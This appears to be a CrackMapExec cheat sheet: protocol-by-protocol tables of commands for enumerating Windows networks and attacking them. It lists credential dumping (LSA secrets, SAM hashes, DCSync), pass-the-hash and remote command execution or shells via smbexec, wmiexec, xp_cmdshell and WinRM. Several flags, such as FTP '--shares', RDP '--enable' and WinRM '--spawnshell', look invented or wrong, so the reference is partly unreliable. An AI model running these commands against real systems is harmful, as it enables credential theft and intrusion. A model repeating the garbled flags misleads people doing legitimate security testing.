# CrackMapExec (CME) Cheat Sheet - Enumeration and Attacks

## 1. SMB Commands

| Command | Description |
|---------|-------------|
| `crackmapexec smb <target> --shares` | Enumerates shared folders on the target. |
| `crackmapexec smb <target> --sessions` | Enumerates active sessions on the target. |
| `crackmapexec smb <target> --users` | Enumerates user accounts on the target. |
| `crackmapexec smb <target> --groups` | Lists groups on the target. |
| `crackmapexec smb <target> --pass-pol` | Retrieves the password policy on the target. |
| `crackmapexec smb <target> --lsa` | Dumps LSA secrets. |
| `crackmapexec smb <target> --sam` | Dumps SAM hashes. |
| `crackmapexec smb <target> --exec-method smbexec` | Executes commands on the target using SMBExec. |
| `crackmapexec smb <target> --exec-method wmiexec` | Executes commands on the target using WMIExec. |
| `crackmapexec smb <target> --exec-method mmcexec` | Executes commands on the target using MMCExec. |
| `crackmapexec smb <target> -u <username> -p <password> --shares` | Enumerates shared folders using credentials. |
| `crackmapexec smb <target> -u <username> -p <password> --sessions` | Enumerates active sessions using credentials. |
| `crackmapexec smb <target> -u <username> -p <password> --users` | Enumerates user accounts using credentials. |
| `crackmapexec smb <target> -u <username> -p <password> --groups` | Lists groups using credentials. |
| `crackmapexec smb <target> -u <username> -p <password> --pass-pol` | Retrieves the password policy using credentials. |
| `crackmapexec smb <target> -u <username> -p <password> --shares -H <NTLM hash>` | Enumerates shared folders using NTLM hash. |
| `crackmapexec smb <target> -u <username> -p <password> --sessions -H <NTLM hash>` | Enumerates active sessions using NTLM hash. |
| `crackmapexec smb <target> -u <username> -p <password> --users -H <NTLM hash>` | Enumerates user accounts using NTLM hash. |
| `crackmapexec smb <target> -u <username> -p <password> --groups -H <NTLM hash>` | Lists groups using NTLM hash. |
| `crackmapexec smb <target> -u <username> -p <password> --pass-pol -H <NTLM hash>` | Retrieves the password policy using NTLM hash. |

## 2. FTP Commands

| Command | Description |
|---------|-------------|
| `crackmapexec ftp <target>` | Enumerates FTP servers on the target. |
| `crackmapexec ftp <target> -u <username> -p <password>` | Enumerates FTP servers using credentials. |
| `crackmapexec ftp <target> --shares` | Lists shared folders on FTP servers. |
| `crackmapexec ftp <target> --sessions` | Lists active sessions on FTP servers. |

## 3. LDAP Commands

| Command | Description |
|---------|-------------|
| `crackmapexec ldap <target>` | Enumerates LDAP servers on the target. |
| `crackmapexec ldap <target> -u <username> -p <password>` | Enumerates LDAP servers using credentials. |
| `crackmapexec ldap <target> --groups` | Lists groups on LDAP servers. |
| `crackmapexec ldap <target> --users` | Lists users on LDAP servers. |
| `crackmapexec ldap <target> --computers` | Lists computers on LDAP servers. |
| `crackmapexec ldap <target> --gpos` | Lists Group Policy Objects (GPOs) on LDAP servers. |
| `crackmapexec ldap <target> --dcsync` | Dumps Active Directory information using the DCSync attack. |

## 4. MSSQL Commands

| Command | Description |
|---------|-------------|
| `crackmapexec mssql <target>` | Enumerates MSSQL servers on the target. |
| `crackmapexec mssql <target> -u <username> -p <password>` | Enumerates MSSQL servers using credentials. |
| `crackmapexec mssql <target> --users` | Lists users on MSSQL servers. |
| `crackmapexec mssql <target> --groups` | Lists groups on MSSQL servers. |
| `crackmapexec mssql <target> --spns` | Lists Service Principal Names (SPNs) on MSSQL servers. |
| `crackmapexec mssql <target> --xp_cmdshell` | Executes commands on the target using xp_cmdshell. |

## 5. RDP Commands

| Command | Description |
|---------|-------------|
| `crackmapexec rdp <target>` | Checks for RDP service on the target. |
| `crackmapexec rdp <target> -u <username> -p <password>` | Checks RDP service using credentials. |
| `crackmapexec rdp <target> --enable` | Enables RDP on the target. |
| `crackmapexec rdp <target> --disable` | Disables RDP on the target. |

## 6. SSH Commands

| Command | Description |
|---------|-------------|
| `crackmapexec ssh <target>` | Enumerates SSH servers on the target. |
| `crackmapexec ssh <target> -u <username> -p <password>` | Enumerates SSH servers using credentials. |
| `crackmapexec ssh <target> --exec` | Executes commands on the target using SSH. |
| `crackmapexec ssh <target> --scp` | Copies files to the target using SCP over SSH. |

## 7. WinRM Commands

| Command | Description |
|---------|-------------|
| `crackmapexec winrm <target>` | Enumerates WinRM service on the target. |
| `crackmapexec winrm <target> -u <username> -p <password>` | Enumerates WinRM service using credentials. |
| `crackmapexec winrm <target> --exec` | Executes commands on the target using WinRM. |
| `crackmapexec winrm <target> --spawnshell` | Spawns an interactive shell on the target using WinRM. |

## Notes
- Replace `<target>` with the IP address or hostname of the target.
- Replace `<username>`, `<password>`, and `<NTLM hash>` with actual credentials or hashes.
